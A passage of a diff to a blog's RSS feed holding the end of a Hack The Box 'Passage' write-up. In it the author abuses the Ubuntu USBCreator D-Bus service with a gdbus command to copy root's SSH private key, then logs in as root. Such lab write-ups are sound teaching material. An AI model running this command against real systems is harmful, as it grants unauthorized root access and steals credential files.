+&lt;span class=&#34;ln&#34;&gt;23&lt;/span&gt;&amp;lt;/busconfig&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;[Configuration]
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;AdminIdentities=unix-group:sudo;unix-group:admin
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;nadav@passage:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;so i copy the file name and google it.
+&lt;img src=&#34;https://mdninja.ml/images/passage/passage_priv_google.png&#34; alt=&#34;&#34;&gt;
+what i understand is the user with sudo group can do the privilage escalation and the user nadav is the sudo group user so i try that command.
+after that i used the command to get the ssh key of the root user and copied to the /home/nadav/key&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;so let login to the root user....&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;$ssh -i root.key root@passage.htb
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;root@passage:~# id
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;root@passage:~# wc root.txt
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt; 1  1 33 root.txt
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;root@passage:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;center&gt;#rooted&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
     <item>
       <title>Lame Writeup</title>
       <link>https://mdninja.ml/post/lame_htb/</link>
